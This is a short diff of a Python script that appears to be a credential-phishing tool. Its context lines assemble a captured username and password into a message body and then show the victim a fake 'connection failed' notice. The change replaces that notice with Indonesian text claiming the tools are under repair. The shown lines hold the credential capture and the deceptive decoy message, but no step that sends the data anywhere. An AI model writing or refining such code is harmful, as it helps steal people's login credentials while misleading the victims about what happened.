@@ -26,7 +26,7 @@ def main():
         msg=('username: '+u+', password: '+p)
         body=(msg)
         print('')
-        print('\x1b[00mSorry, connection failed\x1b[91m !\x1b[00m')
+        print('\x1b[00mSorry, tools sedang diperbaiki\x1b[91m !\x1b[00m')
         print('\x1b[33mPlease try again later ...')
         os.system('sleep 3')
         print('')
